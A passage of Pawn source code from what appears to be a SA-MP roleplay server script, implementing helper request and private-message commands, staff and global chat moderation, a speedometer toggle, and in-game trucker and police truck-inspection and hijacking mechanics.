	else if(PlayerInfo[playerid][pHelper] == 2)
	{
		format(string, sizeof(string), "(( Senior Helper %s: %s ))", GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 2;
	}
	else if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pVip] == 1)
	{
		format(string, sizeof(string), "(( Level %d Player %s: %s ))", PlayerInfo[playerid][pLevel], GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 5;
	}
	else if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pVip] == 0)
	{
		format(string, sizeof(string), "(( Level %d Player %s: %s ))", PlayerInfo[playerid][pLevel], GetPlayerNameEx(playerid), params);
		GlobalChatTimer[playerid] = 5;
	}
	else if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		format(string, sizeof(string), "(( Level %d Admin %s: %s ))", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid), params);
	}

	foreach(Player, i)
	{
		if(GlobalChat[i] == 1)
		{
			SendClientMessage(i, COLOR_NEWS, string);
		}
	}
	return 1;
}

CMD:requesthelp(playerid, params[]) {
	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /requesthelp [help reason]");

	if(PlayerInfo[playerid][pNMute] == 0 && PlayerInfo[playerid][pHelper] == 0) {
	    SetPVarString(playerid, "helpreq", params);

	    SendClientMessage(playerid, COLOR_WHITE, "Your help request has been submitted to the team of helpers.");

	    new
	        szMessage[128];

	    format(szMessage, sizeof(szMessage), "HelpCmd: %s (%d) has just sent a request for help; %s", GetPlayerNameEx(playerid), playerid, params);
	    HelperBroadcast(COLOR_LIGHTBLUE, szMessage, 1);
	} else SendClientMessage(playerid, COLOR_GREY, "You can't send a help request are you're muted from newbie chat, you can ask for an unmute using /report.");

	return 1;
}

CMD:helpers(playerid, params[]) {
    if(PlayerInfo[playerid][pHelper] >= 1 || PlayerInfo[playerid][pAdmin] >= 1) {
        new
            iCount,
            szMessage[128];

        foreach(Player, x) {
            if(PlayerInfo[x][pHelper] > 0) {
				format(szMessage, sizeof(szMessage), "Level %d Helper: %s | Requests Accepted: %d", PlayerInfo[x][pHelper], GetPlayerNameEx(x), PlayerInfo[x][pAcceptReport]);
				SendClientMessage(playerid, COLOR_GREY, szMessage);

				iCount++;
			}
		}

		if(iCount == 0)
		    return SendClientMessage(playerid, COLOR_GREY, "There aren't any helpers online right now.");
    }
	return 1;
}

CMD:helprequests(playerid, params[]) {
    if(PlayerInfo[playerid][pHelper] >= 2 || PlayerInfo[playerid][pAdmin] >= 1) {
        new
            szReason[100],
            iCount,
            szMessage[128];

		foreach(Player, x) {
		    if(GetPVarType(x, "helpreq") != 0) {
			    GetPVarString(x, "helpreq", szReason, sizeof(szReason));
			    format(szMessage, sizeof(szMessage), "Name: %s (ID: %d) | Message: %s", GetPlayerNameEx(x), x, szReason);
			    SendClientMessage(playerid, COLOR_WHITE, szMessage);

				iCount++;
		    }
		}

		if(iCount == 0)
		    SendClientMessage(playerid, COLOR_GREY, "There are no active help requests right now.");
	}
	return 1;
}

CMD:acceptpm(playerid, params[]) {
	if(PlayerInfo[playerid][pHelper] >= 2 || PlayerInfo[playerid][pAdmin] >= 1) {
		new
		    szMessage[128],
		    szReason[100],
			iTarget;

		if(sscanf(params, "u", iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /acceptpm [playerid]");

		if(iTarget == INVALID_PLAYER_ID)
		    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

		if(GetPVarType(iTarget, "helpreq") == 0)
		    return SendClientMessage(playerid, COLOR_GREY, "The player specified has not requested help.");

		GetPVarString(iTarget, "helpreq", szReason, sizeof(szReason));

		format(szMessage, sizeof(szMessage), "You have accepted %s's (ID: %d) help request; %s", GetPlayerNameEx(iTarget), iTarget, szReason);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Please use '/pm' to exchange messages.");

		PlayerInfo[playerid][pAcceptReport]++;

		HelperPM[iTarget] = playerid;
		HelperPM[playerid] = iTarget;

		format(szMessage, sizeof(szMessage), "%s has accepted your help request, please use '/pm' to reply.", GetPlayerNameEx(playerid));
		SendClientMessage(iTarget, COLOR_LIGHTBLUE, szMessage);

		format(szMessage, sizeof(szMessage), "HelpCmd: %s has accepted %s's (ID: %d) help request (PM).", GetPlayerNameEx(playerid), GetPlayerNameEx(iTarget), iTarget);
		HelperBroadcast(COLOR_ORANGE, szMessage, 1);

		DeletePVar(iTarget, "helpreq");
	}
	return 1;
}

CMD:quitpm(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2 || PlayerInfo[playerid][pHelper] >= 1) {
        if(HelperPM[playerid] != INVALID_PLAYER_ID) {
			new
				szMessage[128];

			format(szMessage, sizeof(szMessage), "%s has ended the helper private message session.", GetPlayerNameEx(playerid));
			SendClientMessage(HelperPM[playerid], COLOR_LIGHTBLUE, szMessage);

			format(szMessage, sizeof(szMessage), "You have ended the private message session with %s.", GetPlayerNameEx(HelperPM[playerid]));
			SendClientMessage(playerid, COLOR_WHITE, szMessage);

			HelperPM[HelperPM[playerid]] = INVALID_PLAYER_ID;
			HelperPM[playerid] = INVALID_PLAYER_ID;
        } else SendClientMessage(playerid, COLOR_GREY, "You are not actively helping someone.");
    }
	return 1;
}

CMD:pm(playerid, params[])
{
	new
		iMessage[128];
	if(sscanf(params, "s[128]", iMessage))
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: /pm [message]");

	if(HelperPM[playerid] == INVALID_PLAYER_ID && (PlayerInfo[playerid][pHelper] >= 2 || PlayerInfo[playerid][pAdmin] >= 1))
		return SendClientMessage(playerid, COLOR_GREY, "You are not actively helping someone.");

	if(HelperPM[playerid] == INVALID_PLAYER_ID && (PlayerInfo[playerid][pHelper] == 0 || PlayerInfo[playerid][pAdmin] == 0))
		return SendClientMessage(playerid, COLOR_GREY, "Nobody is actively helping you.");

	new
		szMessage[128];

	format(szMessage, sizeof(szMessage), "(( PM from %s: %s ))", GetPlayerNameEx(playerid), iMessage);
	SendClientMessage(HelperPM[playerid], COLOR_YELLOW, szMessage);

	format(szMessage, sizeof(szMessage), "(( PM sent to %s: %s ))", GetPlayerNameEx(HelperPM[playerid]), iMessage);
	SendClientMessage(playerid, COLOR_YELLOW, szMessage);
	return 1;
}

CMD:accepthelp(playerid, params[]) {
	if(PlayerInfo[playerid][pHelper] >= 2 || PlayerInfo[playerid][pAdmin] >= 1) {
		new
		    szMessage[128],
		    szReason[100],
			iTarget;

		if(sscanf(params, "u", iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /accepthelp [playerid]");

		if(GetPVarInt(playerid, "EventToken") == 1 || PlayerInfo[playerid][pJailTime] > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

		if(iTarget == INVALID_PLAYER_ID)
		    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

		if(GetPVarType(iTarget, "helpreq") == 0)
		    return SendClientMessage(playerid, COLOR_GREY, "The player specified has not requested help.");

		if(GetPVarType(playerid, "posX") != 0)
			return SendClientMessage(playerid, COLOR_GREY, "You are actively helping someone.");

		GetPVarString(iTarget, "helpreq", szReason, sizeof(szReason));

		format(szMessage, sizeof(szMessage), "You have accepted %s's help request; %s", GetPlayerNameEx(iTarget), szReason);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);

		GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
		SetPVarFloat(playerid, "posX", PlayerInfo[playerid][pPos_x]);
        SetPVarFloat(playerid, "posY", PlayerInfo[playerid][pPos_y]);
        SetPVarFloat(playerid, "posZ", PlayerInfo[playerid][pPos_z]);
        SetPVarInt(playerid, "posInt", GetPlayerInterior(playerid));
        SetPVarInt(playerid, "posVW", GetPlayerVirtualWorld(playerid));
		new Float:hp;
		GetPlayerHealth(playerid, hp);
        SetPVarFloat(playerid, "HelpHealth", hp);
		new Float: fArmour;
		if(GetPlayerArmour(playerid, fArmour) < ValidArmor[playerid]) GetPlayerArmour(playerid, PlayerInfo[playerid][pArmor]);
		else PlayerInfo[playerid][pArmor] = ValidArmor[playerid];
        SetPVarFloat(playerid, "HelpArmour", PlayerInfo[playerid][pArmor]);

		Helper[playerid] = CreateDynamic3DTextLabel("HELPER", COLOR_LIGHTBLUE, 0.0, 0.0, 0.0, 7.5, playerid, INVALID_VEHICLE_ID, 1, GetPlayerVirtualWorld(iTarget), GetPlayerInterior(iTarget), playerid, 7.5);


		TogglePlayerControllable(iTarget, 0);
		UnfreezeDelay(iTarget);

        GetPlayerPos(iTarget, PlayerInfo[iTarget][pPos_x], PlayerInfo[iTarget][pPos_y], PlayerInfo[iTarget][pPos_z]);
        SetPlayerPos(playerid, PlayerInfo[iTarget][pPos_x], PlayerInfo[iTarget][pPos_y], PlayerInfo[iTarget][pPos_z]);
		SetPlayerInterior(playerid, GetPlayerInterior(iTarget));
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(iTarget));

		if(GetPlayerInterior(iTarget) > 0 || GetPlayerVirtualWorld(iTarget) > 0) {
			LoadObjectsForPlayer(playerid);
		}

		PlayerInfo[playerid][pAcceptReport]++;

		format(szMessage, sizeof(szMessage), "%s has accepted your help request.", GetPlayerNameEx(playerid));
		SendClientMessage(iTarget, COLOR_LIGHTBLUE, szMessage);

		format(szMessage, sizeof(szMessage), "HelpCmd: %s has accepted %s's (ID: %d) help request.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTarget), iTarget);
		HelperBroadcast(COLOR_ORANGE, szMessage, 1);

		DeletePVar(iTarget, "helpreq");
	}
	return 1;
}

CMD:quithelp(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 2 || PlayerInfo[playerid][pHelper] >= 1) {
        if(GetPVarType(playerid, "posX") != 0) {
	        SetPlayerInterior(playerid, GetPVarInt(playerid, "posInt"));
	        SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "posVW"));
	        SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "HelpArmour"));
	        SetPlayerHealth(playerid, GetPVarFloat(playerid, "HelpHealth"));
	        SetPlayerPos(playerid, GetPVarFloat(playerid, "posX"), GetPVarFloat(playerid, "posY"), GetPVarFloat(playerid, "posZ"));
			DestroyDynamic3DTextLabel(Helper[playerid]);

	        SendClientMessage(playerid, COLOR_WHITE, "You have teleported back to your previous position prior to logging off.");

	        DeletePVar(playerid, "posX");
	        DeletePVar(playerid, "posY");
	        DeletePVar(playerid, "posZ");
	        DeletePVar(playerid, "posInt");
	        DeletePVar(playerid, "posVW");
	        DeletePVar(playerid, "HelpHealth");
	        DeletePVar(playerid, "HelpArmour");
        } else SendClientMessage(playerid, COLOR_GREY, "You are not actively helping someone.");
    }
	return 1;
}

CMD:togc(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 2) {
        switch(GetPVarInt(playerid, "cschat")) {
			case 0: {
			    SetPVarInt(playerid, "cschat", 1);
			    SendClientMessage(playerid, COLOR_WHITE, "You will no longer see messages in the /c channel. Use /togc to see messages again.");
			}
			case 1: {
			    DeletePVar(playerid, "cschat");
			    SendClientMessage(playerid, COLOR_WHITE, "You will now see messages in the /c channel again.");
			}
		}
    }
	return 1;
}

CMD:c(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 2) {
		if(isnull(params))
		    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /c(ommunitystaff) [message]");

		new
		    string[128];

		if(PlayerInfo[playerid][pAdmin] > 0)
			format(string, sizeof(string), "** Level %d Admin %s: %s", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid), params);
		else if(PlayerInfo[playerid][pHelper] >= 2)
		    format(string, sizeof(string), "*** Senior Helper %s: %s", GetPlayerNameEx(playerid), params);

		foreach(Player, x) {
		    if(PlayerInfo[x][pAdmin] > 0 && GetPVarInt(x, "cschat") == 0 || PlayerInfo[x][pHelper] >= 2 && GetPVarInt(x, "cschat") == 0)
		        SendClientMessage(x, COLOR_LIGHTBLUE, string);
		}
	}
	return 1;
}
/*
CMD:setdonator(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 5) {
		new string[128], giveplayerid, level;
		if(sscanf(params, "ud", giveplayerid, level)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setdonator [player] [level]");
			SendClientMessage(playerid, COLOR_GRAD3, "Available Levels: |0| None |1| Bronze |2| Silver |3| Gold");
			return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(level < 0 || level > 3)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "VIP Level can't be below 0 or above 3!");
					return 1;
				}
				PlayerInfo[giveplayerid][pVip] = level;

				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
				if(level == 0)
				{
					format(string, sizeof(string), "AdmCmd: %s has set %s's VIP level to None (%d).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), level);
					ABroadCast(COLOR_LIGHTRED,string, 4);
					format(string, sizeof(string), "Your VIP level has been set to None by Admin %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_WHITE, string);

					format(string, sizeof(string), "AdmCmd: %s has set %s's (IP:%s) VIP level to None (%d).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), playerip, level);
					Log("logs/setvip.log", string);
					return 1;
				}
				if(level == 1)
				{
					format(string, sizeof(string), "AdmCmd: %s has set %s's VIP level to Bronze (%d).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), level);
					ABroadCast(COLOR_LIGHTRED,string, 4);
					format(string, sizeof(string), "Your VIP level has been set to Bronze by Admin %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_WHITE, string);

					format(string, sizeof(string), "AdmCmd: %s has set %s's (IP:%s) VIP level to Bronze (%d).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), playerip, level);
					Log("logs/setvip.log", string);
					return 1;
				}
				if(level == 2)
				{
					format(string, sizeof(string), "AdmCmd: %s has set %s's VIP level to Silver (%d).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), level);
					ABroadCast(COLOR_LIGHTRED,string, 4);
					format(string, sizeof(string), "Your VIP level has been set to Silver by Admin %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_WHITE, string);

					format(string, sizeof(string), "AdmCmd: %s has set %s's (IP:%s) VIP level to Silver (%d).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), playerip, level);
					Log("logs/setvip.log", string);
					return 1;
				}
				if(level == 3)
				{
					format(string, sizeof(string), "AdmCmd: %s has set %s's VIP level to Gold (%d).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), level);
					ABroadCast(COLOR_LIGHTRED,string, 4);
					format(string, sizeof(string), "Your VIP level has been set to Gold by Admin %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_WHITE, string);

					format(string, sizeof(string), "AdmCmd: %s has set %s's (IP:%s) VIP level to Gold (%d).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), playerip, level);
					Log("logs/setvip.log", string);
					return 1;
				}
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}
*/
CMD:gcto(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /gcto [playerid/partofname] [reason]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pGCMuted] == 0)
			{
				PlayerInfo[giveplayerid][pGCMutedTime] = 15*60;
				PlayerInfo[giveplayerid][pGCMuted] = 2;
				format(string, sizeof(string), "AdmCmd: %s has temporarily blocked %s from using Global Chat, reason: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
				ABroadCast(COLOR_LIGHTRED,string,1);

				format(string, sizeof(string), "You have been temporarily blocked from using Global Chat by %s, reason: %s.", GetPlayerNameEx(playerid), reason);
				SendClientMessage(giveplayerid, COLOR_GRAD2, string);

				SendClientMessage(giveplayerid, COLOR_GRAD2, "You will not be able to use Global Chat for 15 minutes.");
				SendClientMessage(giveplayerid, COLOR_GRAD2, "Note the future abuse of Global Chat could result in loss of that privilege altogether or being banned from the server.");


				format(string, sizeof(string), "AdmCmd: %s was temporarily blocked from Global Chat by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				Log("logs/mute.log", string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "That player is already disabled from Global Chat.");
			}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:gcreset(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /gcoreset [playerid/partofname] [reason]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pGCMuted] == 2)
			{
				PlayerInfo[giveplayerid][pGCMuted] = 0;
				PlayerInfo[giveplayerid][pGCMutedTime] = 0;
				format(string, sizeof(string), "AdmCmd: %s has unblocked %s from using Global Chat, reason: %s",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
				ABroadCast(COLOR_LIGHTRED,string,1);

				SendClientMessage(giveplayerid, COLOR_GRAD2, "You have been unblocked from using Global Chat. You may now use the Global Chat system again.");
				SendClientMessage(giveplayerid, COLOR_GRAD2, "Please accept our apologies for any error and inconvenience this may have caused.");

				format(string, sizeof(string), "AdmCmd: %s was unblocked from Global Chat by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid),reason);
				Log("logs/mute.log", string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "That player is not temporarily disabled from Global Chat.");
			}

		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:gcmute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /gcmute [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pGCMuted] == 0)
			{
				PlayerInfo[giveplayerid][pGCMuted] = 1;
				format(string, sizeof(string), "AdmCmd: %s has indefinitely blocked %s from using Global Chat.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ABroadCast(COLOR_LIGHTRED,string,1);

				foreach(Player, i)
				{
					if(GlobalChat[i] == 1 && PlayerInfo[i][pAdmin] < 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTRED, string);
					}
				}

				format(string, sizeof(string), "You have been indefinitely muted from Global Chat for abuse by %s. You may appeal this on the forums (admin complaint)", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_GRAD2, string);

				format(string, sizeof(string), "AdmCmd: %s was blocked from /gc by %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				Log("logs/mute.log", string);
			}
			else
			{
				PlayerInfo[giveplayerid][pGCMuted] = 0;
				PlayerInfo[giveplayerid][pGCMutedTime] = 0;
				format(string, sizeof(string), "AdmCmd: %s has been re-allowed to use Global Chat by %s.",GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				ABroadCast(COLOR_LIGHTRED,string,1);

				foreach(Player, i)
				{
					if(GlobalChat[i] == 1 && PlayerInfo[i][pAdmin] < 2)
					{
						SendClientMessage(playerid, COLOR_LIGHTRED, string);
					}
				}

				format(string, sizeof(string), "You have been re-allowed to use Global Chat by %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_GRAD2, string);

				format(string, sizeof(string), "AdmCmd: %s was unblocked from /gc by %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
				Log("logs/mute.log", string);
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:speedo(playerid, params[]) {
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) {
		SendClientMessage(playerid, COLOR_GREY, "You're not driving a vehicle.");
	}
	else if(!PlayerInfo[playerid][pSpeedo]) {
		SendClientMessage(playerid, COLOR_WHITE, "You have enabled your speedometer.");
		PlayerInfo[playerid][pSpeedo] = 1;

		if(!FindTimePoints[playerid]) {

			new
				szSpeed[42];

			format(szSpeed, sizeof(szSpeed),"~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~%.0f MPH", player_get_speed(playerid));
			GameTextForPlayer(playerid, szSpeed, 1500, 3);
		}
	}
	else {
		SendClientMessage(playerid, COLOR_WHITE, "You have disabled your speedometer.");
		PlayerInfo[playerid][pSpeedo] = 0;
		if(!FindTimePoints[playerid]) GameTextForPlayer(playerid, " ", 1500, 3);
	}
	return 1;
}

CMD:checktruck(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 20 && PlayerInfo[playerid][pJob2] != 20 && !IsACop(playerid))
	{
        SendClientMessage(playerid, COLOR_GRAD2, "You're not a Trucker or a Cop!");
        return 1;
	}

	new carid = GetPlayerVehicleID(playerid);
 	new closestcar = GetClosestCar(playerid, carid);
  	if(IsPlayerInRangeOfVehicle(playerid, closestcar, 6.0) && IsATruckerCar(closestcar))
	{
		new string[128];

		new truckcontents = TruckContents[closestcar];
		new truckcontentname[50];
		if(truckcontents == 0)
		{ format(truckcontentname, sizeof(truckcontentname), "None"); }
		else if(truckcontents >= 1 && truckcontents <= 3)
		{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Food & beverages");}
		else if(truckcontents >= 4 && truckcontents <= 6)
		{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Clothing"); }
		else if(truckcontents == 7)
		{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Legal materials"); }
		else if(truckcontents >= 8 && truckcontents <= 10)
		{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}24/7 items"); }
		else if(truckcontents >= 11 && truckcontents <= 15)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal weapons"); }
		else if(truckcontents >= 16 && truckcontents <= 20)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal drugs"); }
		else if(truckcontents >= 21 && truckcontents <= 25)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal materials"); }

     	SendClientMessage(playerid, COLOR_GREEN,"________________ OCEAN DOCKS TRUCK ________________");
		if(IsPlayerInVehicle(playerid, closestcar))
  		{
    		SendClientMessage(playerid, COLOR_WHITE, "There is a player in that Truck. In order to check the content of the Truck the driver must be removed.");
      		return 1;
		}

		format(string, sizeof(string), "Vehicle registration: %s (%d)", GetVehicleName(closestcar), closestcar);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "Content: %s", truckcontentname);
		SendClientMessage(playerid, COLOR_WHITE, string);

		if(IsACop(playerid) && truckcontents >= 11)
		{
			SendClientMessage(playerid, COLOR_YELLOW, "To remove the illegal goods type /cleartruck near the Truck.");
		}

		if(PlayerInfo[playerid][pJob] == 20 || PlayerInfo[playerid][pJob2] == 20)
		{
			if(truckcontents > 0 && TruckUsed[playerid] == INVALID_VEHICLE_ID)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "To deliver the goods type /hijacktruck as the driver.");
			}
			else if(TruckUsed[playerid] == INVALID_VEHICLE_ID)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "To get goods type /loadtruck as the driver.");
			}
			else if(TruckUsed[playerid] == closestcar && gPlayerCheckpointStatus[playerid] == CHECKPOINT_RETURNTRUCK)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "This is your Truck, you have not returned it to the docks yet for your pay.");
			}
			else if(TruckUsed[playerid] == closestcar)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "This is your Truck, you have not delivered your goods yet.");
			}
			else if(TruckUsed[playerid] != INVALID_VEHICLE_ID)
			{
				SendClientMessage(playerid, COLOR_YELLOW, "You're already on another delivery, type /cancel truck to cancel that delivery.");
			}
		}
     	SendClientMessage(playerid, COLOR_GREEN,"_________________________________________________________");
    }
	else
	{
 		SendClientMessage(playerid, COLOR_GRAD1, "You're not near a Truck.");
 	}
    return 1;
}

CMD:cleartruck(playerid, params[])
{
	if(!IsACop(playerid))
	{
        SendClientMessage(playerid, COLOR_GRAD2, "You're not a Cop!");
        return 1;
	}

	new carid = GetPlayerVehicleID(playerid);
 	new closestcar = GetClosestCar(playerid, carid);
  	if(IsPlayerInRangeOfVehicle(playerid, closestcar, 6.0) && IsATruckerCar(closestcar))
	{
		new truckcontents = TruckContents[closestcar];
		if(truckcontents < 11)
		{
			SendClientMessage(playerid, COLOR_WHITE, "There are no illegal items in that Truck.");
			return 1;
		}
		new string[128];

		new truckcontentname[50];
		if(truckcontents >= 11 && truckcontents <= 15)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}illegal weapons"); }
		else if(truckcontents >= 16 && truckcontents <= 20)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}illegal drugs"); }
		else if(truckcontents >= 21 && truckcontents <= 25)
		{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}illegal materials"); }
 		foreach(Player, i)
		{
  			if(TruckUsed[i] == closestcar)
     		{
    			DestroyProgressBar(LoadTruckBar[i]);
				LoadTruckBar[i] = INVALID_BAR_ID;
				LoadTruckTime[i] = 0;
				DeletePVar(i, "TruckDeliver");
				TruckUsed[i] = INVALID_VEHICLE_ID;
				TruckContents[closestcar] = 0;
				DisablePlayerCheckpoint(i);
				gPlayerCheckpointStatus[i] = CHECKPOINT_NONE;
 				SendClientMessage(i, COLOR_WHITE, "Your Truck delivery has failed. Law enforcement has confiscated the illegal goods.");
       		}
		}
		format(string, sizeof(string), "You removed the %s {FFFFFF}from the Truck.", truckcontentname);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "* %s has taken the illegal items from the Truck.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
    }
   	else
	{
 		SendClientMessage(playerid, COLOR_GRAD1, "You're not near a Truck.");
 	}
    return 1;
}

CMD:hijacktruck(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 20 || PlayerInfo[playerid][pJob2] == 20)
	{
	    new vehicleid = GetPlayerVehicleID(playerid);
	    if(IsATruckerCar(vehicleid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
     		if(CheckPointCheck(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");

			if(GetProgressBarValue(LoadTruckBar[playerid]) > 10)
       		{
         		SendClientMessage(playerid, COLOR_WHITE, "You're currently loading your Truck!");
				return 1;
     		}
       		if(TruckUsed[playerid] != INVALID_VEHICLE_ID)
         	{
          		SendClientMessage(playerid, COLOR_WHITE, "You're already on another delivery, type /cancel truck to cancel that delivery.");
				return 1;
     		}
			if(TruckContents[vehicleid] == 0)
			{
   				SendClientMessage(playerid, COLOR_WHITE, "This Truck is empty, it does not contain any goods!");
				return 1;
			}
			if(IsPlayerInRangeOfPoint(playerid, 65, -1547.66,124.64,3.55))
			{
				SendClientMessage(playerid, COLOR_WHITE, "You can't hijack when that close to Easter Basin!");
				return 1;
			}

			SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You're now attempting to hijack the truck, please wait....");

			TogglePlayerControllable(playerid, 0);
			SetPVarInt(playerid, "IsFrozen", 1);

			LoadTruckBar[playerid] = CreateProgressBar(258.00, 137.00, 131.50, 3.19, COLOR_GREEN, 100.0);
			SetProgressBarValue(LoadTruckBar[playerid], 100.0);
			ShowProgressBarForPlayer(playerid, LoadTruckBar[playerid]);
			SetTimerEx("HijackTruck", 1000, 0, "dd", playerid);
	    }
	    else return SendClientMessage(playerid, COLOR_GREY, "You're not driving a Truck!");
	}
	else return SendClientMessage(playerid, COLOR_GREY, "You're not a Trucker!");
	return 1;
}


forward HijackTruck(playerid);
public HijackTruck(playerid)
{
    new vehicleid = GetPlayerVehicleID(playerid);
	LoadTruckTime[playerid]--;
